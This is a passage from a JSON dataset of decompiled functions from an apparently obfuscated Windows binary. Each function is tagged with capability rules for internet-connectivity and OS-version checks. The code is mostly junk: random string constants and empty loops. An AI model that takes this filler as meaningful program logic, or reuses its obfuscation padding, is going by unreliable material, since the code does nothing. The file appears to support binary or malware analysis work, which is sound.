fcn.004b21e0(\"ifotvilcilgogshmshjmfewlqkbuguxxfggduoalghedfxakrgvkhahjntas\", &var_90h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qfodkgadlrutobwwsqphtbgiyequqm\", &var_90h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"uboabtknhxildvklbvvsmyzvaywamhiimdsesmmmcjbpruvrrhonmzinqmwgrdhckmbsgujnyjvvyqfbaezbsfx\", &var_90h + 2\n                );\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"iblmflhmefagpvtphrlldhpfekfhbasrtcxocqeswtsnrlpcdficvzshtlyewwsukaxveiqdnkfqtecbixyvw\", &var_90h + 3);\n    fcn.00483140();\n    var_1ch = 0xa5b;\n    var_1dh = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"iblmflhmefagpvtphrlldhpfekfhbasrtcxocqeswtsnrlpcdficvzshtlyewwsukaxveiqdnkfqtecbixyvw\", &var_71h);\n    fcn.00483110();\n    fcn.004b21e0(\"iblmflhmefagpvtphrlldhpfekfhbasrtcxocqeswtsnrlpcdficvzshtlyewwsukaxveiqdnkfqtecbixyvw\", &var_55h);\n    cVar1 = fcn.004c09a0(&var_71h + 1, var_8ch);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x2a; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"uboabtknhxildvklbvvsmyzvaywamhiimdsesmmmcjbpruvrrhonmzinqmwgrdhckmbsgujnyjvvyqfbaezbsfx\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"uboabtknhxildvklbvvsmyzvaywamhiimdsesmmmcjbpruvrrhonmzinqmwgrdhckmbsgujnyjvvyqfbaezbsfx\", &var_1eh);\n    cVar1 = fcn.004c1070(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x55; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1174
    },
    "00426784": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl fcn.00426784(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_60h;\n    uint var_45h;\n    uint var_29h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"igadcikgnodumpeheqjpudkzaokvunorpbcpiyuhonfgadxyuiqdpyirisxghhtdtts\", &var_45h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"igadcikgnodumpeheqjpudkzaokvunorpbcpiyuhonfgadxyuiqdpyirisxghhtdtts\", &var_29h);\n    fcn.00483110();\n    fcn.004b21e0(\"igadcikgnodumpeheqjpudkzaokvunorpbcpiyuhonfgadxyuiqdpyirisxghhtdtts\", &var_dh);\n    cVar2 = fcn.004c1070(&var_29h + 1, &var_45h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x523228;\n    if (cVar2 != '\\0') {\n        for (stack0xfffffff0 = 10; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 452
    },
    "00426902": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00426902(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uint var_7bh;\n    uint var_5dh;\n    uint var_42h;\n    uint var_31h;\n    ulong uStack44;\n    uint var_1ch;\n    ulong uStack28;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"lzabonlrtonbqzefgbcjwsuhdxxszutbyyzbrqgbfnaetmrirymwoeayz\", &var_7bh);\n    fcn.00483140();\n    var_10h = 0xda8;\n    fcn.00483110();\n    fcn.004b21e0(\"zrpmapkvnonalranhmkowzejetiokznxieoqmyslybysfycx\", &var_7bh + 1);\n    fcn.00483140();\n    uStack28 = *0x523230;\n    var_1ch = 0x268;\n    uStack44 = *0x523238;\n    stack0xffffffcc = *0x523240;\n    var_31h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"dqmvpkhjkmrgzloyctpdmphssofpojuwcuupkfrkrjxccfgpkvkmllwodauoj\", &var_7bh + 2);\n    fcn.00483140();\n    stack0xffffffbc = *0x523248;\n    fcn.00483110();\n    fcn.004b21e0(\"lzabonlrtonbqzefgbcjwsuhdxxszutbyyzbrqgbfnaetmrirymwoeayz\", &var_5dh);\n    fcn.00483110();\n    fcn.004b21e0(\"lzabonlrtonbqzefgbcjwsuhdxxszutbyyzbrqgbfnaetmrirymwoeayz\", &var_42h);\n    cVar1 = fcn.004c09a0(&var_5dh + 1, &var_7bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x3e; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x52059e, &var_42h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 847
    },
    "00426bc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid fcn.00426bc4(void)\n\n{\n    char cVar1;\n    uint var_9ch;\n    uint var_90h;\n    uint var_78h;\n    uint var_60h;\n    uint var_47h;\n    uint var_29h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"wtngqeehyfmnfbyuflthzbqzkivhdgkfidfmsuhcpnnxfrwwstkfmmbzzhelhzddolqgiczhwettwoqfx\", &var_47h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"imnojttsccnfajiqvhaaamrqucrshbtnzccsjdbbmtuqkhgwwnoxjbhjhxfjhbtgnsznkmjwnrpeixuyas\", &var_47h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wykxpoacvhoooxvekmrmzdnortuhonlytejmrrhcjywyeohcmlswruqoidzxzzcemirwakibxsilks\", &var_47h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wtngqeehyfmnfbyuflthzbqzkivhdgkfidfmsuhcpnnxfrwwstkfmmbzzhelhzddolqgiczhwettwoqfx\", &var_29h);\n    fcn.00483110();\n    fcn.004b21e0(\"wtngqeehyfmnfbyuflthzbqzkivhdgkfidfmsuhcpnnxfrwwstkfmmbzzhelhzddolqgiczhwettwoqfx\", &var_dh);\n    cVar1 = fcn.004c1070(&var_29h + 1, &var_47h + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x46; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 614
    },
    "00426ec4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint fcn.00426ec4(void)\n\n{\n    uint var_4ch;\n    uint var_44h;\n    uint var_2ah;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x523278;\n    var_1ch = 0x327;\n    var_20h = 0x499;\n    var_24h = 0x458;\n    fcn.00483110();\n    fcn.004b21e0(\"gkeuuztfcjosxmnznsze\", &var_2ah);\n    fcn.00483140();\n    stack0xffffffd4 = 0x136c;\n    var_2ah._1_1_ = 1;\n    for (var_ch = 0x31; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 1; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 297
    },
    "004270e6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.004270e6(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_18h;\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x59; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return *0x5232a8;\n}\n",
        "token_count": 215
    },
    "00427170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00427170(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_40h;\n    uchar var_25h;\n    uint var_24h;\n    ulong uStack36;\n    ulong uStack28;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    uStack28 = *0x5232b0;\n    uStack36 = *0x5232b8;\n    var_24h = 0x1e00;\n    fcn.00483110();\n    fcn.004b21e0(\"ufjlceoyukimannvltahfkhwexkvpww\", &var_25h);\n    fcn.00483140();\n    for (stack0xfffffff0 = 0x4d; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 305
    },
    "00427222": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00427222(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint in_ECX;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_3ch;\n    uint var_22h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0xcc7;\n    fcn.00483110();\n    fcn.004b21e0(\"lcxhssnvwwnptkydaoagjesibwbcskklsaab\", &var_22h);\n    fcn.00483140();\n    var_15h = 0;\n    var_16h = 0;\n    var_17h = 1;\n    stack0xffffffdc = *0x5232c0;\n    for (var_ch = 0x51; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x13; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zcixrehzqdxxko\", &var_22h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 380
    },
    "00427326": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00427326(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_24h, uint arg_28h, uint noname_9, uint arg_30h, uint noname_11, uint arg_38h, uint arg_3ch)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x29; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0xca2d;\n}\n",
        "token_count": 228
    },
    "0042738c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042738c(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    uint var_b0h;\n    uint var_ach;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ah;\n    uint var_4dh;\n    uint var_31h;\n    ulong uStack44;\n    uint var_20h;\n    uint var_19h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x5232c8;\n    var_19h._0_1_ = 1;\n    var_20h = 0x902;\n    fcn.00483110();\n    fcn.004b21e0(\"hkbxyiouzyxqapjqkbxlzohfswvkvzvrbpgonfqysxzpgurasasfannhftawsa\", &var_6ah);\n    fcn.00483140();\n    uStack44 = *0x5232d0;\n    stack0xffffffcc = *0x5232d8;\n    fcn.00483110();\n    fcn.004b21e0(\"wsajixpppnhkhtpudvzhp\", &var_6ah + 1);\n    fcn.00483140();\n    for (var_ch = 0x16; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"hkbxyiouzyxqapjqkbxlzohfswvkvzvrbpgonfqysxzpgurasasfannhftawsa\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"hkbxyiouzyxqapjqkbxlzohfswvkvzvrbpgonfqysxzpgurasasfannhftawsa\", &var_31h);\n    cVar1 = fcn.004c09a0(&var_4dh + 1, &var_6ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 3; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 623
    },
    "004283d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004283d6(uint param_1)\n\n{\n    char cVar1;\n    uint var_8ch;\n    uint var_84h;\n    uint var_69h;\n    uint var_4dh;\n    uchar var_32h;\n    uchar var_31h;\n    uint var_30h;\n    uint var_29h;\n    uchar var_1ah;\n    uint var_19h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 1;\n    stack0xffffffe4 = *0x5233f0;\n    var_19h._0_1_ = 1;\n    var_1ah = 0;\n    stack0xffffffd4 = *0x5233f8;\n    fcn.00483110();\n    fcn.004b21e0(\"orvhunnnuicxgbyztfnacpcissjzz\", &var_69h);\n    fcn.00483140();\n    var_29h._0_1_ = 1;\n    var_30h = 0x34e;\n    fcn.00483110();\n    fcn.004b21e0(\"orvhunnnuicxgbyztfnacpcissjzz\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"orvhunnnuicxgbyztfnacpcissjzz\", &var_32h);\n    cVar1 = fcn.004c1070(&var_4dh + 1, &var_69h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x13; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"sahfvfutxfive\", &var_31h);\n    fcn.00483140();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 536
    },
    "0042858c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0042858c(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3ch;\n    uint var_23h;\n    uchar var_12h;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0xf5;\n    var_11h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"kiezbtoyvncedklibkjnwhwhsubvldnxloljguxefpkwdokilshebdffnfdvzievawvxsfhhcau\", &var_23h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"hqspo\", &var_23h + 1);\n    fcn.00483140();\n    var_12h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"ksdw\", &var_23h + 2);\n    fcn.00483140();\n    stack0xffffffdc = *0x523400;\n    for (var_ch = 6; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 380
    },
    "004286e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.004286e0(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint in_ECX;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_41h;\n    uint var_40h;\n    uint var_3ch;\n    ulong uStack60;\n    ulong uStack52;\n    ulong uStack44;\n    ulong uStack36;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack36 = *0x523408;\n    uStack44 = *0x523410;\n    uStack52 = *0x523418;\n    uStack60 = *0x523420;\n    var_3ch = 0x10e4;\n    var_40h = 0x2583;\n    for (var_ch = 0x23; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x15; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x32; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x520d07, &var_41h);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 430
    },
    "004287ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004287ec(uint arg_8h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_120h;\n    uint var_11ch;\n    uint var_10ch;\n    uint var_f4h;\n    uint var_dah;\n    uint var_bdh;\n    uint var_a1h;\n    uint var_85h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    uchar var_21h;\n    uint var_20h;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_19h._0_1_ = 1;\n    var_20h = 0x2fe;\n    fcn.00483110();\n    fcn.004b21e0(\"mtimiefpwywckqszzvwtkpwplmnwxiboqikmskpjanajzklrz\", &var_dah);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"icuatbnnrakmkwzkyepqplgoxxyrurrffnwkvouvyinyuqgtzcpjopuzztsudurewmcryfuopjrdadsxzyuv\", &var_dah + 1);\n    fcn.00483140();\n    var_21h = 0;\n    stack0xffffffcc = *0x523428;\n    fcn.00483110();\n    fcn.004b21e0(\"icuatbnnrakmkwzkyepqplgoxxyrurrffnwkvouvyinyuqgtzcpjopuzztsudurewmcryfuopjrdadsxzyuv\", &var_bdh);\n    fcn.00483110();\n    fcn.004b21e0(\"icuatbnnrakmkwzkyepqplgoxxyrurrffnwkvouvyinyuqgtzcpjopuzztsudurewmcryfuopjrdadsxzyuv\", &var_a1h);\n    cVar2 = fcn.004c09a0(&var_bdh + 1, &var_dah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x47; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x23; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"mtimiefpwywckqszzvwtkpwplmnwxiboqikmskpjanajzklrz\", &var_85h);\n    fcn.00483110();\n    fcn.004b21e0(\"mtimiefpwywckqszzvwtkpwplmnwxiboqikmskpjanajzklrz\", &var_69h);\n    cVar2 = fcn.004c1070(&var_85h + 1, &var_a1h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_14h = 0x2d; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"icuatbnnrakmkwzkyepqplgoxxyrurrffnwkvouvyinyuqgtzcpjopuzztsudurewmcryfuopjrdadsxzyuv\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"icuatbnnrakmkwzkyepqplgoxxyrurrffnwkvouvyinyuqgtzcpjopuzztsudurewmcryfuopjrdadsxzyuv\", &var_31h);\n    cVar2 = fcn.004c09a0(&var_4dh + 1, &var_69h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x523430;\n    if (cVar2 != '\\0') {\n        for (stack0xffffffe4 = 0x60; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 1171
    },
    "00428c8e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00428c8e(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_150h;\n    uint var_136h;\n    uint var_119h;\n    uint var_fdh;\n    uint var_e1h;\n    uint var_c5h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    int32_t var_1eh;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"jgcytltobgyjnrjysm\", &var_136h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_136h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_119h);\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_fdh);\n    cVar1 = fcn.004c1070(&var_119h + 1, &var_136h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x50; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"jgcytltobgyjnrjysm\", &var_e1h);\n    fcn.00483110();\n    fcn.004b21e0(\"jgcytltobgyjnrjysm\", &var_c5h);\n    cVar1 = fcn.004c09a0(&var_e1h + 1, &var_fdh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x45; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_a9h);\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_8dh);\n    cVar1 = fcn.004c09a0(&var_a9h + 1, &var_c5h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x12; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_71h);\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_55h);\n    cVar1 = fcn.004c1070(&var_71h + 1, &var_8dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 5; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"tebqunsknvbrocicscnvaelszyorrxzh\", &var_1eh);\n    cVar1 = fcn.004c09a0(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe0 = 0x3c; 0 < stack0xffffffe0; unique0x00007a80 = stack0xffffffe0 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"gptgavxrckgaiicy\", &var_1eh + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 1351
    },
    "00429638": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
